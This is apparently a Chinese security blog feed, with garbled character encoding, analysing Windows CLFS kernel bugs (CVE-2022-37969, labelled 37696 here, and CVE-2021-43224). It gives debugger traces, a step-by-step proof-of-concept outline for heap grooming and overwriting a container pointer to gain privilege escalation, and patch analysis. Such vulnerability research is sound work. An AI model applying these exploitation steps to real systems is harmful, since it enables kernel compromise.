class="hljs-number">0</span>x<span class="hljs-number">1</span>e<span class="hljs-number">8</span><span class="hljs-attribute">04</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">41080</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">372</span>da<span class="hljs-number">2</span>     CLFS!CClfsBaseFilePersisted::OpenImage+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>fa<span class="hljs-attribute">05</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">41100</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">39</span>eaeb     CLFS!CClfsLogFcbPhysical::Initialize+<span class="hljs-number">0</span>x<span class="hljs-number">326</span><span class="hljs-attribute">06</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">41240</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">3</span>a<span class="hljs-number">0</span>a<span class="hljs-number">2</span>b     CLFS!CClfsRequest::Create+<span class="hljs-number">0</span>x<span class="hljs-number">4</span>ef</code></pre><p><code>ClfsDecodeBlock</code>å‡½æ•°ä¼šå¾ªç¯å°†<code>signArray</code>çš„å†…å®¹å–å‡ºï¼Œæ”¾å…¥<code>base+0x200*N+0x1FE</code>çš„åœ°æ–¹å»ï¼Œå› æ­¤<code>0x0050</code>ä¼šè¢«å†™å…¥<code>13th</code>(<code>(0x68-0x50)/2+1</code>)çš„<code>sector</code>çš„<code>Signature</code>åœ°æ–¹</p><p><img src="/img/CVE-2022-37696/ClfsDecodeBlockIDA.png" alt="ClfsDecodeBlockIDA"></p><p><img src="/img/CVE-2022-37696/ClfsDecodeBlockWindbg.png" alt="ClfsDecodeBlockWindbg"></p><p>P.S è¿™ä¸ª<code>0x0050</code>åç»­ä¼šè¢«å†™å›æ¥ï¼›è¿™ä¸ª <code>signArray</code> éƒ½æ˜¯2ä¸ªå­—èŠ‚å¤§å°çš„</p><p>P.S. <a href="https://github.com/ionescu007/clfs-docs/">clfs-docs</a> æœ‰å¯¹äºè¿™ä¸ªæ¯ä¸ª<code>sector</code>çš„ç­¾åæ•°ç»„çš„è¯¦ç»†è¯´æ˜ï¼Œå…¶å®è¿™é‡Œçš„<code>decode</code>å’Œ<code>encode</code>å…¶å®å°±æ˜¯ï¼šå½“ä»ç£ç›˜ä¸­è¯»<code>blf</code>æ—¶ï¼Œè§£æè¯¥æ•°ç»„ï¼Œä»¥æ¢å¤è¿™ä¸ª<code>sector</code>çš„å†…å­˜ï¼›ä»<code>sector</code>å†…å­˜è·å–å€¼ï¼Œä»¥å­˜å‚¨åˆ°è¿™ä¸ªæ•°ç»„ä¸­ã€‚</p><p><code>When reading the Base Log File from disk, it is critical to parse this array, and take each 2 bytes and overlay them on top of the signature bytes of each corresponding sector (restoring the original data bytes).</code></p><h4 id="Fake-Client-Context-çš„è§£æ"><a href="#Fake-Client-Context-çš„è§£æ" class="headerlink" title="Fake Client Context çš„è§£æ"></a>Fake Client Context çš„è§£æ</h4><p>åœ¨<code>CClfsBaseFile::AcquireClientContext</code>ä¸­ï¼Œä¸»è¦ä¼šè·å–<code>Fake Client Context</code>ï¼Œä»è€Œå†™åˆ°ä¸€ä¸ª<code>sector</code>çš„</p><p>ä¸‹å›¾ä¸º<code>CClfsLogFcbPhysical::Initialize</code>ä¸­å¯¹äº<code>CClfsBaseFile::AcquireClientContext</code>çš„è°ƒç”¨</p><p><img src="/img/CVE-2022-37696/AcquireClientContextIDA.png" alt="AcquireClientContextIDA"></p><p>åœ¨<code>CClfsBaseFile::AcquireClientContext</code>ä¸­è°ƒç”¨<code>CClfsBaseFile::GetSymbol</code>è·å–<code>1st rgClients</code>çš„å†…å®¹</p><p><img src="/img/CVE-2022-37696/GetSymbolIDA.png" alt="GetSymbolIDA"></p><p>å…¶ä¸­å¯¹äº<code>fake client context</code>ä¹‹å‰çš„å†…å®¹ä¿®æ”¹ï¼Œå°±æ˜¯ä¸ºäº†è¿‡è¿™é‡Œçš„æ£€æµ‹ï¼Œå¯ä»¥é€šè¿‡æŸ¥çœ‹åŸæ¥çš„<code>real client context</code>æŸ¥çœ‹è¿™ä¸ªæ£€æµ‹ï¼Œ<code>0x13f0 = 0x1368+0x88 | 0x1bd8 = 0x1368+0x870</code>ï¼Œå› æ­¤æœ€åçš„åœ°æ–¹åº”è¯¥æ˜¯<code>0x1b30+0x88=0x1bb8</code></p><p><img src="/img/CVE-2022-37696/RealClientContext.png" alt="RealClientContext"></p><h4 id="ResetLog-è¦†ç›–-sector-çš„-signature"><a href="#ResetLog-è¦†ç›–-sector-çš„-signature" class="headerlink" title="ResetLog è¦†ç›– sector çš„ signature"></a>ResetLog è¦†ç›– sector çš„ signature</h4><p>è¿™é‡Œ<code>v75</code>ä¸º<code>fake client context</code>ï¼Œä¸ºäº†èƒ½èµ°åˆ°<code>CClfsLogFcbPhysical::ResetLog</code>ï¼Œåˆ™éœ€è¦å°†å…¶è®¾ç½®ä¸º<code>0x20</code>ï¼Œä¸”ä½¿<code>CClfsLogFcbPhysical:IsMultiplexed</code>è¿”å›<code>false</code></p><p><img src="/img/CVE-2022-37696/eStateIDA.png" alt="eStateIDA"></p><p>åœ¨è¿™é‡Œï¼Œç”±äºä¿®æ”¹äº†<code>Fake Client Context</code>çš„åç§»ï¼Œå› æ­¤æœ€å<code>CLFS_LSN_INVALID:0xffffffff</code>æ°å¥½å†™å…¥äº†<code>14th sector</code>çš„<code>signature</code>ä½ç½®</p><p><img src="/img/CVE-2022-37696/ResetLogIDA.png" alt="ResetLogIDA"></p><h4 id="overwrite-Signatures-Offset"><a href="#overwrite-Signatures-Offset" class="headerlink" title="overwrite Signatures Offset"></a>overwrite Signatures Offset</h4><p>æœ€åè¿™ä¸ªé€šè¿‡é—´æ¥è·³è½¬èµ°åˆ°<code>ClfsEncodeBlock</code>çš„åœ°æ–¹ï¼Œç„¶åé€šè¿‡<code>encode</code>æŠŠ<code>0x0050</code>å’Œ<code>0xffff</code>å†™å›ï¼Œæœ€åå¯¼è‡´<code>signaturesOffset</code>çš„å€¼å°±è¢«ä¿®æ”¹æˆäº†ä¸åˆç†çš„è¶…å¤§å€¼</p><p><img src="/img/CVE-2022-37696/FlushMetadataIDA.png" alt="FlushMetadataIDA"></p><p>æ•´ä½“çš„è°ƒç”¨é“¾å¦‚ä¸‹æ‰€ç¤º</p><pre><code class="hljs apache"><span class="hljs-attribute">0</span>: kd&gt; k <span class="hljs-comment"># Child-SP          RetAddr               Call Site</span><span class="hljs-attribute">00</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">40</span>fd<span class="hljs-number">8</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">3</span>a<span class="hljs-number">2232</span>     CLFS!ClfsEncodeBlock<span class="hljs-attribute">01</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">40</span>fe<span class="hljs-number">0</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">3999</span>a<span class="hljs-number">0</span>     CLFS!CClfsBaseFilePersisted::WriteMetadataBlock+<span class="hljs-number">0</span>x<span class="hljs-number">152</span><span class="hljs-attribute">02</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">41070</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">37161</span>f     CLFS!CClfsBaseFilePersisted::FlushImage+<span class="hljs-number">0</span>x<span class="hljs-number">40</span><span class="hljs-attribute">03</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">410</span>b<span class="hljs-number">0</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">373701</span>     CLFS!CClfsLogFcbPhysical::FlushMetadata+<span class="hljs-number">0</span>xef<span class="hljs-attribute">04</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">41100</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">39</span>eaeb     CLFS!CClfsLogFcbPhysical::Initialize+<span class="hljs-number">0</span>xc<span class="hljs-number">85</span><span class="hljs-attribute">05</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">41240</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">3</span>a<span class="hljs-number">0</span>a<span class="hljs-number">2</span>b     CLFS!CClfsRequest::Create+<span class="hljs-number">0</span>x<span class="hljs-number">4</span>ef<span class="hljs-attribute">06</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">41390</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">3</span>a<span class="hljs-number">07</span>f<span class="hljs-number">7</span>     CLFS!CClfsRequest::Dispatch+<span class="hljs-number">0</span>x<span class="hljs-number">97</span></code></pre><p>æœ€åçš„å†™å›<code>signArray</code></p><p><img src="/img/CVE-2022-37696/ClfsEncodeBlockPrivateIDA.png" alt="ClfsEncodeBlockPrivateIDA"></p><p>å¯ä»¥çœ‹åˆ°æœ€åè¢«ä¿®æ”¹æˆäº†<code>0xffff0050</code></p><h4 id="ç•¸å½¢çš„-SignatureOffset-å½±å“çš„æ•´ä¸ªè¿‡ç¨‹æ€»ç»“"><a href="#ç•¸å½¢çš„-SignatureOffset-å½±å“çš„æ•´ä¸ªè¿‡ç¨‹æ€»ç»“" class="headerlink" title="ç•¸å½¢çš„ SignatureOffset å½±å“çš„æ•´ä¸ªè¿‡ç¨‹æ€»ç»“"></a>ç•¸å½¢çš„ SignatureOffset å½±å“çš„æ•´ä¸ªè¿‡ç¨‹æ€»ç»“</h4><p>è§£æ<code>signArray</code>ï¼Œå‘<code>13th sector</code>å†™å…¥<code>0x0050</code>ï¼Œè§£æ<code>fake client context</code>ï¼Œä½¿å¾—<code>14th sector</code>å†™å…¥<code>0xffff</code>ï¼Œæœ€å<code>ClfsEncodeBlockPrivate</code>ï¼Œå†™å›<code>signArray</code>ï¼Œä»è€Œæ„é€ äº†ä¸€ä¸ªè¶…å¤§å€¼<code>signaturesOffset</code></p><p><img src="/img/CVE-2022-37696/Vuln.png" alt="Vuln"></p><h2 id="POC-åˆ†æ"><a href="#POC-åˆ†æ" class="headerlink" title="POC åˆ†æ"></a>POC åˆ†æ</h2><p>é‡æ–°æ¥çœ‹è¿™ä¸ª<code>POC</code>çš„å›¾</p><p><img src="/img/CVE-2022-37696/POC.png" alt="POC"></p><ol><li>åˆå§‹åŒ–<code>MyLog.blf</code></li><li>å †é£æ°´å¸ƒå±€ï¼Œä»¥ä½¿å¾—åé¢çš„<code>MyLog</code>çš„å †å—å’Œ<code>MyLxg_xxx</code>çš„å †å—æ˜¯è¿ç»­çš„</li><li>æ„é€ ç•¸å½¢çš„<code>MyLog.blf</code>ï¼Œè§£ææ—¶ï¼Œä»èƒ½æ‰“å¼€<code>HANDLE</code></li><li>æ„é€ ä¸<code>MyLog</code>å †å—è¿ç»­çš„å †å—<code>MyLxg_xxx</code></li><li>ç»™<code>MyLxg_xxx</code>æ·»åŠ <code>LogContainer</code>ï¼Œåœ¨è¿™ä¸ªç»“æ„ä½“ä¸­å­˜åœ¨ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ<code>pContainer</code></li><li>è·å–<code>NtSetInformationFile</code>çš„åœ°å€</li><li>ç»™<code>MyLog</code>æ·»åŠ <code>LogContainer</code>ï¼Œæ­¤æ—¶å·²ç»å¯ä»¥æº¢å‡ºåˆ°<code>MyLxg_xxx</code>çš„<code>Container Context</code>çš„<code>pContainer</code></li><li>é€šè¿‡<code>NtSetInformationFile</code>è®¾ç½®<code>MyLxg_xxx</code>ä¸º<code>FileDispositionInformation</code>ï¼Œå³è¯¥å‡½æ•°å°†åœ¨æ–‡ä»¶å…³é—­æ—¶åˆ é™¤æ–‡ä»¶æˆ–å–æ¶ˆå…ˆå‰è¯·æ±‚çš„åˆ é™¤ï¼Œå› æ­¤åœ¨å…³é—­æ–‡ä»¶æ—¶ï¼Œå¯ä»¥è§¦å‘åˆ°<code>removeContainer</code>å¯¹<code>pContainer</code>çš„ä½¿ç”¨ï¼Œä»è€Œè§¦å‘<code>BSOD</code></li><li>è§¦å‘æ¼æ´</li></ol><p>åœ¨æ‰©å¤§è¿™ä¸ªæ¼æ´å½±å“æ—¶ï¼Œæ˜¯è¦†ç›–äº†<code>SignaturesOffset</code>ï¼Œè€Œåœ¨<code>CClfsBaseFilePersisted::AllocSymbol</code>æ—¶ï¼Œåˆ™åˆ©ç”¨<code>SignaturesOffset</code>åšçš„æ£€æµ‹</p><p><img src="/img/CVE-2022-37696/AllocSymbolIDA.png" alt="AllocSymbolIDA"></p><p>å› æ­¤æ­¤æ—¶ï¼Œå¯ä»¥ç›´æ¥ç»•è¿‡è¿™ä¸ªæ£€æµ‹ï¼Œä½¿å¾—<code>cbSymbolZone</code>å¯ä»¥ä¸ºä¸€ä¸ªå¤§å€¼ï¼Œä»è€Œè¦†ç›–åˆ°ä¸‹ä¸€ä¸ªå †å—çš„<code>pContainer</code></p><p><img src="/img/CVE-2022-37696/OOBW.png" alt="OOBW"></p><p>æœ€åæ¼æ´è§¦å‘æ˜¯åœ¨å…³é—­<code>blf</code>æ–‡ä»¶æ—¶ï¼Œåœ¨å‡½æ•°<code>CClfsBaseFilePersisted::RemoveContainer</code>ä¸­ï¼Œä¼šç›´æ¥ä½¿ç”¨<code>pContainer</code>çš„è™šè¡¨è¿›è¡Œå‡½æ•°è°ƒç”¨ï¼Œè€Œè¢«ç ´åçš„<code>pContainer</code>ä¼šå¯¼è‡´<code>BSOD</code>ç”šè‡³<code>EOP</code></p><h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p>è¯¥æ¼æ´çš„<code>patch</code>ï¼Œåœ¨<code>CClfsBaseFilePersisted::LoadContainerQ</code>æ—¶ï¼Œå¯¹äº<code>cbSymbolZone</code>å’Œ<code>signaturesOffset</code>è¿›è¡Œäº†æ£€æµ‹</p><pre><code class="hljs apache"><span class="hljs-attribute">1</span>: kd&gt; k <span class="hljs-comment"># Child-SP          RetAddr               Call Site</span><span class="hljs-attribute">00</span> ffff<span class="hljs-number">810</span>c`a<span class="hljs-number">0</span>c<span class="hljs-number">44</span>fa<span class="hljs-number">0</span> fffff<span class="hljs-number">805</span>`<span class="hljs-number">373</span>b<span class="hljs-number">2176</span>     CLFS!CClfsBaseFilePersisted::LoadContainerQ+<span class="hljs-number">0</span>x<span class="hljs-number">1</span>b<span class="hljs-number">2</span><span class="hljs-attribute">01</span> ffff<span class="hljs-number">810</span>c`a<span class="hljs-number">0</span>c<span class="hljs-number">45100</span> fffff<span class="hljs-number">805</span>`<span class="hljs-number">373</span>df<span class="hljs-number">093</span>     CLFS!CClfsLogFcbPhysical::Initialize+<span class="hljs-number">0</span>x<span class="hljs-number">6</span>da<span class="hljs-attribute">02</span> ffff<span class="hljs-number">810</span>c`a<span class="hljs-number">0</span>c<span class="hljs-number">45240</span> fffff<span class="hljs-number">805</span>`<span class="hljs-number">373</span>e<span class="hljs-number">0</span>aeb     CLFS!CClfsRequest::Create+<span class="hljs-number">0</span>x<span class="hljs-number">4</span>ef</code></pre><p><img src="/img/CVE-2022-37696/patch.png" alt="patch"></p><p><code>CClfsBaseFilePersisted::LoadContainerQ</code>å‡½æ•°åœ¨<code>CClfsLogFcbPhysical::Initialize</code>å‡½æ•°ä¸­ï¼Œä½äº<code>ResetLog</code>ä¹‹åï¼Œ<code>ClfsEncodeBlock</code>ä¹‹å‰</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¯¥æ¼æ´åˆ©ç”¨ä¸æ­£ç¡®çš„<code>SignaturesOffset</code>ï¼Œä»…ä»…èƒ½å†™<code>0xffffffff</code>çš„åˆ©ç”¨ï¼Œæ‰©å¤§åˆ°å†æ¬¡ä¿®æ”¹<code>SignaturesOffset</code>ï¼Œä»è€Œç›´æ¥å¯¼è‡´æº¢å‡º</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><blockquote><p><a href="https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part">https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part</a><br><a href="https://github.com/ionescu007/clfs-docs/blob/main/README.md">https://github.com/ionescu007/clfs-docs/blob/main/README.md</a><br><a href="https://www.slideshare.net/PeterHlavaty/deathnote-of-microsoft-windows-kernel">https://www.slideshare.net/PeterHlavaty/deathnote-of-microsoft-windows-kernel</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows kernel</tag>
      
      <tag>clfs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-43224 æ¼æ´å¤ç°</title>
    <link href="/2022/09/13/CVE-2021-43224%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/09/13/CVE-2021-43224%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><pre><code class="hljs angelscript">è™šæ‹Ÿæœºï¼šWin10 <span class="hljs-number">1903</span> <span class="hljs-number">18362.30</span>ç‰©ç†æœºï¼šWin10debuggerï¼šwindbg previewcompilerï¼švs2022</code></pre><p>ç¯å¢ƒæˆ‘å°±ç›´æ¥ä½¿ç”¨çš„ï¼Œ<code>Win10 1903</code></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æˆ‘è°ƒè¯•æ¼æ´çš„æ—¶å€™ï¼Œç”¨äº†ä¸‰ä¸ª<code>clfs.sys</code>ï¼š<code>Win10 1903</code>ä¸Šçš„<code>2019.03.19</code>çš„<code>clfs.sys</code>ï¼Œå’Œä¸¤ä¸ª<code>MSRC</code>ä¸Šä¸‹è½½çš„<code>win8.1</code>çš„<code>patch</code>å‰åçš„<code>2021.09.18</code>ã€<code>2021.11.16</code>çš„<code>clfs.sys</code>ï¼ˆå…¶ä¸­<code>win8.1</code>çš„<code>clfs.sys</code>å¹¶ä¸èƒ½è·å–å…¶<code>pdb</code>ï¼‰</p><p>æˆ‘åœ¨è°ƒè¯•è¯¥æ¼æ´æ—¶ï¼Œç›´æ¥ä½¿ç”¨äº†è¯¥<a href="https://github.com/KaLendsi/CVE-2021-43224-POC">POC</a>ï¼Œå…ˆè·‘äº†ä¸€æ¬¡ï¼Œå‘ç°å…¶<code>crash</code>çš„åœ°æ–¹ä¸º<code>CClfsLogFcbVirtual::QueryLogFileInfo</code>ï¼Œåœ¨è¯¥å¤„ä¸‹æ–­ç‚¹ï¼Œå‘ç°å½“å‡ºç°ä¸‹è¿°çš„è°ƒç”¨é“¾æ—¶ï¼Œä¼šå‘ç”Ÿ<code>crash</code>ï¼Œæˆ–è€…è¯´åœ¨<code>POC</code>çš„æœ€åä¸€æ¬¡<code>system(&quot;pause&quot;)</code>ä¹‹åçš„<code>CClfsLogFcbVirtual::QueryLogFileInfo</code>å°±ä¼š<code>crash</code></p><pre><code class="hljs apache"><span class="hljs-attribute">0</span>: kd&gt; kb <span class="hljs-comment"># RetAddr               : Args to Child                                                           : Call Site</span><span class="hljs-attribute">00</span> fffff<span class="hljs-number">804</span>`<span class="hljs-number">2</span>b<span class="hljs-number">3817</span>fd     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000002</span> ffffbb<span class="hljs-number">84</span>`d<span class="hljs-number">1</span>efbe<span class="hljs-number">00</span> ffffbb<span class="hljs-number">84</span>`d<span class="hljs-number">04</span>ed<span class="hljs-number">480</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> : CLFS!CClfsLogFcbVirtual::QueryLogFileInfo<span class="hljs-attribute">01</span> fffff<span class="hljs-number">804</span>`<span class="hljs-number">2</span>b<span class="hljs-number">36508</span>b     : ffffbb<span class="hljs-number">84</span>`d<span class="hljs-number">04</span>ed<span class="hljs-number">480</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000110</span> ffffbb<span class="hljs-number">84</span>`d<span class="hljs-number">3</span>a<span class="hljs-number">33</span>d<span class="hljs-number">30</span> ffffbb<span class="hljs-number">84</span>`ce<span class="hljs-number">0</span>a<span class="hljs-number">0600</span> : CLFS!CClfsRequest::LogFileInfo+<span class="hljs-number">0</span>x<span class="hljs-number">149</span><span class="hljs-attribute">02</span> fffff<span class="hljs-number">804</span>`<span class="hljs-number">2</span>b<span class="hljs-number">364</span>e<span class="hljs-number">37</span>     : ffffbb<span class="hljs-number">84</span>`d<span class="hljs-number">04</span>ed<span class="hljs-number">480</span> <span class="hljs-number">00007</span>ffd`<span class="hljs-number">60</span>c<span class="hljs-number">43380</span> ffffbb<span class="hljs-number">84</span>`ceb<span class="hljs-number">07</span>d<span class="hljs-number">80</span> ffff<span class="hljs-number">9480</span>`<span class="hljs-number">00293</span>b<span class="hljs-number">42</span> : CLFS!CClfsRequest::Dispatch+<span class="hljs-number">0</span>xb<span class="hljs-number">7</span><span class="hljs-attribute">03</span> fffff<span class="hljs-number">804</span>`<span class="hljs-number">2</span>b<span class="hljs-number">364</span>d<span class="hljs-number">87</span>     : ffffbb<span class="hljs-number">84</span>`d<span class="hljs-number">1</span>efbe<span class="hljs-number">00</span> ffffbb<span class="hljs-number">84</span>`d<span class="hljs-number">1</span>efbe<span class="hljs-number">00</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> : CLFS!ClfsDispatchIoRequest+<span class="hljs-number">0</span>x<span class="hljs-number">87</span><span class="hljs-attribute">04</span> fffff<span class="hljs-number">804</span>`<span class="hljs-number">2</span>a<span class="hljs-number">4</span>ddda<span class="hljs-number">9</span>     : ffffbb<span class="hljs-number">84</span>`d<span class="hljs-number">1</span>efbe<span class="hljs-number">00</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">0000020</span>c : CLFS!CClfsDriver::LogIoDispatch+<span class="hljs-number">0</span>x<span class="hljs-number">27</span><span class="hljs-attribute">05</span> fffff<span class="hljs-number">804</span>`<span class="hljs-number">2</span>aacbdd<span class="hljs-number">5</span>     : ffffcf<span class="hljs-number">04</span>`d<span class="hljs-number">196</span>bb<span class="hljs-number">80</span> ffffbb<span class="hljs-number">84</span>`d<span class="hljs-number">1</span>efbe<span class="hljs-number">00</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> ffffbb<span class="hljs-number">84</span>`d<span class="hljs-number">3</span>a<span class="hljs-number">33</span>d<span class="hljs-number">30</span> : nt!IofCallDriver+<span class="hljs-number">0</span>x<span class="hljs-number">59</span><span class="hljs-attribute">06</span> fffff<span class="hljs-number">804</span>`<span class="hljs-number">2</span>aacb<span class="hljs-number">72</span>a     : ffffbb<span class="hljs-number">84</span>`d<span class="hljs-number">1</span>efbe<span class="hljs-number">00</span> ffffcf<span class="hljs-number">04</span>`d<span class="hljs-number">196</span>bb<span class="hljs-number">80</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">80076818</span> ffffcf<span class="hljs-number">04</span>`d<span class="hljs-number">196</span>bb<span class="hljs-number">80</span> : nt!IopSynchronousServiceTail+<span class="hljs-number">0</span>x<span class="hljs-number">1</span>a<span class="hljs-number">5</span><span class="hljs-attribute">07</span> fffff<span class="hljs-number">804</span>`<span class="hljs-number">2</span>aacb<span class="hljs-number">146</span>     : <span class="hljs-number">00007</span>ffd`<span class="hljs-number">60</span>c<span class="hljs-number">43380</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> : nt!IopXxxControlFile+<span class="hljs-number">0</span>x<span class="hljs-number">5</span>ca<span class="hljs-attribute">08</span> fffff<span class="hljs-number">804</span>`<span class="hljs-number">2</span>a<span class="hljs-number">683</span>e<span class="hljs-number">95</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> : nt!NtDeviceIoControlFile+<span class="hljs-number">0</span>x<span class="hljs-number">56</span><span class="hljs-attribute">09</span> <span class="hljs-number">00007</span>ffd`<span class="hljs-number">6765</span>c<span class="hljs-number">144</span>     : <span class="hljs-number">00007</span>ffd`<span class="hljs-number">653</span>f<span class="hljs-number">57</span>b<span class="hljs-number">7</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000100</span> <span class="hljs-number">00000197</span>`<span class="hljs-number">00000001</span> : nt!KiSystemServiceCopyEnd+<span class="hljs-number">0</span>x<span class="hljs-number">25</span><span class="hljs-attribute">0a</span> <span class="hljs-number">00007</span>ffd`<span class="hljs-number">653</span>f<span class="hljs-number">57</span>b<span class="hljs-number">7</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000100</span> <span class="hljs-number">00000197</span>`<span class="hljs-number">00000001</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000003</span> : ntdll!NtDeviceIoControlFile+<span class="hljs-number">0</span>x<span class="hljs-number">14</span><span class="hljs-attribute">0b</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000100</span> <span class="hljs-number">00000197</span>`<span class="hljs-number">00000001</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000003</span> <span class="hljs-number">00000093</span>`bdcff<span class="hljs-number">9</span>a<span class="hljs-number">0</span> : <span class="hljs-number">0</span>x<span class="hljs-number">00007</span>ffd`<span class="hljs-number">653</span>f<span class="hljs-number">57</span>b<span class="hljs-number">7</span></code></pre><p>å…¶æ¼æ´åŸå› ä¹Ÿå¾ˆç®€å•ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå…¶æ¼æ´ä¸ºï¼Œåœ¨é—´æ¥è°ƒç”¨æ—¶ï¼Œè°ƒç”¨<code>CClfsLogFcbPhysical::QueryLogFileInfo</code>æ—¶ï¼Œä¼šå¯¹äºè¯¥å‚æ•°è¿›è¡Œ<code>memset(src, 0, *a7)</code>çš„æ“ä½œï¼Œè€Œ<code>*a7</code>å°±æ˜¯æˆ‘ä»¬è¾“å…¥<code>size</code>å¤§å°ï¼Œè€Œ<code>src</code>çš„å¤§å°ä¸º<code>0x78</code>ï¼Œå› æ­¤å°±ä¼šé€ æˆè¶Šç•Œå†™é›¶</p><p><img src="/img/CVE-2021-43224/CClfsLogFcbVirtual.png" alt="CClfsLogFcbVirtual::QueryLogFileInfo"></p><p><img src="/img/CVE-2021-43224/CClfsLogFcbPhysical.png" alt="CClfsLogFcbPhysical::QueryLogFileInfo"></p><p>è°ƒç”¨<code>CClfsLogFcbPhysical::QueryLogFileInfo</code>ä¹‹å‰çš„<code>CClfsLogFcbVirtual::QueryLogFileInfo</code>çš„æ ˆå¸§å¦‚ä¸‹</p><pre><code class="hljs dns">    CLFS!CClfsLogFcbVirtual<span class="hljs-number">::</span>QueryLogFileInfo:fffff8<span class="hljs-number">07`05759070</span> <span class="hljs-number">4053</span>             push    rbxfffff8<span class="hljs-number">07`05759072</span> <span class="hljs-number">56</span>               push    rsifffff8<span class="hljs-number">07`05759073</span> <span class="hljs-number">57</span>               push    rdifffff8<span class="hljs-number">07`05759074</span> <span class="hljs-number">4154</span>             push    r12fffff8<span class="hljs-number">07`05759076</span> <span class="hljs-number">4155</span>             push    r13fffff8<span class="hljs-number">07`05759078</span> <span class="hljs-number">4156</span>             push    r14fffff807`<span class="hljs-number">0575907</span>a <span class="hljs-number">4157</span>             push    r15fffff807`<span class="hljs-number">0575907</span>c <span class="hljs-number">4881</span>ecf<span class="hljs-number">0000000</span>   sub     rsp, <span class="hljs-number">0</span>F0hfffff8<span class="hljs-number">07`05759083</span> <span class="hljs-number">488</span>b05a63fffff   mov     rax, qword ptr [CLFS!__security_cookie (fffff80<span class="hljs-number">70574d030</span>)]fffff807`<span class="hljs-number">0575908</span>a <span class="hljs-number">4833</span>c4           xor     rax, rspfffff807`<span class="hljs-number">0575908d</span> <span class="hljs-number">48898424</span>e<span class="hljs-number">0000000</span> mov     qword ptr [rsp+<span class="hljs-number">0</span>E0h], rax<span class="hljs-number">1</span>: kd&gt; dq rsp rsp+<span class="hljs-number">0</span>x128fffff986`f<span class="hljs-number">0d95570</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>fffff986`f<span class="hljs-number">0d95580</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span 